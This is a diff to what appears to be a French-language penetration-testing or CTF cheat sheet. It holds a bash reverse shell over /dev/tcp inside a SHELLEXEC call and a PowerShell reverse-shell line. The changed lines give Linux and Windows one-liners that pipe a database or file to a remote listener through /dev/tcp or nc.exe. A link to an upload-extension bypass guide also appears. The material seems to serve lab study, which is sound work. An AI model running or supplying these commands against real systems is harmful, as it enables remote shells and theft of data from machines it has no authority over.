@@ -29,7 +29,8 @@ CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.10.10/1234 0>&1')
 
 - Reverse shell powerhell --> `powershell -r 10.10.9.11:1234`
 
-- Afficher un fichier à travers un reverse shell --> `cat nocturnal_database.db > /dev/tcp/10.xx.xx.xx/8888` ; de l'autre côté --> `nc -lnvp 8888 > nocturnal.db`
+- Récuperer un fichier à travers un reverse shell LINUX --> `cat nocturnal_database.db > /dev/tcp/10.xx.xx.xx/8888` ; de l'autre côté --> `nc -lnvp 8888 > nocturnal.db`
+- Récuperer un fichier à travers un reverse shell WINDOWS --> `Get-Content '08949382-134f-4c63-b93c-ce52efc0aa88' | .\nc.exe 10.10.16.15 1236`; de l'autre côté --> `nc -lnvp 1236 > 08949382-134f-4c63-b93c-ce52efc0aa88`
 
 - [Bypass extension](https://d00mfist.gitbooks.io/ctf/content/bypass_image_upload.html)
 
